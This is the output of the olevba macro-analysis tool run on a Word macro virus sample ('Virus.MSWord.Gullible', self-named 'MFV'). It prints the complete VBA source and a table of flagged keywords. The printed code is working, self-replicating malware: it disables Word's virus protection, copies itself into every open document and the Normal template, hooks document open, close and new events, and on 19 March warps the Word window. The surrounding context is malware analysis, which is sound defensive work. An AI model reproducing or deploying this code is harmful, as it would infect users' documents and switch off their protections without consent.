olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gullible-d972c490757f7fb6e3ddd5b6795d05d26381cbe2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gullible-d972c490757f7fb6e3ddd5b6795d05d26381cbe2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SetWindowRgn Lib "user32" (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Private Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Sub MFV(Method As String)
    Dim Doc As Document, Comp, CodeMod As Object, SaveIt As Boolean, i As Integer
        
    If Application.UserName = Chr(Val("&H53")) + Chr(Val("&H2E")) + Chr(Val("&H20")) + Chr(Val("&H42")) + Chr(Val("&H61")) + Chr(Val("&H63")) + Chr(Val("&H68")) Then
        If Method = "O" Then MsgBox "Ich bin wieder hier!", vbOKOnly + vbDefaultButton1 + vbInformation, "MFV"
        Options.VirusProtection = True
        Exit Sub
    End If

    
    Options.VirusProtection = False
    
    
    'Infection
    For Each Doc In Documents
        SaveIt = Doc.Saved
        
        For Each Comp In Doc.VBProject.VBComponents
            If Comp.Type = 100 Then Call Infect(Comp.CodeModule)
        Next
        
        If SaveIt And (Dir(Doc.FullName) <> "") Then Doc.Save
    Next
    Call Infect(normal.ThisDocument.VBProject.VBComponents(1).CodeModule)
    
    'Destruction
    If Method = "C" And (Format(Date, "dd-mm") = "19-03") Then
        Assistant.Visible = True
        Assistant.Animation = MsoAnimationType.msoAnimationGetTechy
        
        Application.WindowState = wdWindowStateNormal
        Application.Width = 500
        Application.Height = 500
        SetWindowRgn FindWindow("OpusApp", vbNullString), CreateEllipticRgn(0, 0, 600, 600), True
    
        With Assistant.NewBalloon
            .BalloonType = MsoBalloonType.msoBalloonTypeNumbers
            .Mode = MsoModeType.msoModeModal
            .Icon = MsoIconType.msoIconAlert
            .Button = MsoButtonSetType.msoButtonSetCancel
            .Heading = "MFV"
            .Text = MacroContainer.Name & " was infected by MFV (My First Virus)"
            .Show
        End With

        Assistant.Animation = MsoAnimationType.msoAnimationThinking
    
        With Assistant.NewBalloon
            .BalloonType = MsoBalloonType.msoBalloonTypeNumbers
            .Mode = MsoModeType.msoModeModal
            .Icon = MsoIconType.msoIconTip
            .Button = MsoButtonSetType.msoButtonSetCancel
            .Heading = "MFV"
            .Text = "This virus is not harmful. Belive me!" & vbCrLf & "Your window was only deformed, not more!" & vbCrLf & vbCrLf & "This virus is freeware. You may give it to anyone!"
            .Show
        End With
    End If
End Sub
Private Sub Infect(CodeMod As Object)
    Dim StartOpen As Integer, StartClose As Integer, StartNew As Integer, IsInfected As Boolean
    Dim Sex As Object, DoIt As Boolean, i As Integer
    
    IsInfected = False: StartOpen = 0: StartClose = 0: StartNew = 0
    For i = 1 To CodeMod.CountOfLines
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("Sub Document_Open()")) Then StartOpen = i
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("Sub Document_Close()")) Then StartClose = i
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("Sub Document_New()")) Then StartNew = i
        If InStr(1, UCase(CodeMod.Lines(i, 1)), UCase("'Infected by My first Virus")) Then IsInfected = True
    Next i

    If Not IsInfected Then
        CodeMod.AddFromString "Private Declare Function SetWindowRgn Lib " & Chr(34) & "user32" & Chr(34) & " (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long"
        CodeMod.AddFromString "Private Declare Function CreateEllipticRgn Lib " & Chr(34) & "gdi32" & Chr(34) & " (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long"
        CodeMod.AddFromString "Private Declare Function FindWindow Lib " & Chr(34) & "user32" & Chr(34) & " Alias " & Chr(34) & "FindWindowA" & Chr(34) & " (ByVal lpClassName As String, ByVal lpWindowName As String) As Long"
        
        For Each Sex In MacroContainer.VBProject.VBComponents
        For i = 1 To Sex.CodeModule.CountOfLines
            If Sex.CodeModule.Lines(i, 1) = "Private Sub MFV(Method As String)" Then DoIt = True
            If Sex.CodeModule.Lines(i, 1) = "Private Sub Infect(CodeMod As Object)" Then DoIt = True
            If DoIt Then CodeMod.InsertLines CodeMod.CountOfLines + 1, Sex.CodeModule.Lines(i, 1)
            If Sex.CodeModule.Lines(i, 1) = "End Sub" And DoIt Then DoIt = False
        Next i
        Next
        
        If StartOpen = 0 Then
            CodeMod.InsertLines CodeMod.CountOfLines + 1, ""
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "Private Sub Document_Open()"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "    Call MFV(" & Chr(34) & "O" & Chr(34) & ")"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "End Sub"
        Else
            CodeMod.InsertLines StartOpen + 1, "    Call MFV(" & Chr(34) & "O" & Chr(34) & ")"
        End If
        
        If StartClose = 0 Then
            CodeMod.InsertLines CodeMod.CountOfLines + 1, ""
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "Private Sub Document_Close()"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "    Call MFV(" & Chr(34) & "C" & Chr(34) & ")"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "End Sub"
        Else
            CodeMod.InsertLines StartClose + 1, "    Call MFV(" & Chr(34) & "C" & Chr(34) & ")"
        End If
        
        If StartNew = 0 Then
            CodeMod.InsertLines CodeMod.CountOfLines + 1, ""
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "Private Sub Document_New()"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "    Call MFV(" & Chr(34) & "N" & Chr(34) & ")"
            CodeMod.InsertLines CodeMod.CountOfLines + 1, "End Sub"
        Else
            CodeMod.InsertLines StartNew + 1, "    Call MFV(" & Chr(34) & "N" & Chr(34) & ")"
        End If
    End If
End Sub

Private Sub Document_Open()
    Call MFV("O")
End Sub

Private Sub Document_Close()
    Call MFV("C")
End Sub

Private Sub Document_New()
    Call MFV("N")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|DoIt                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

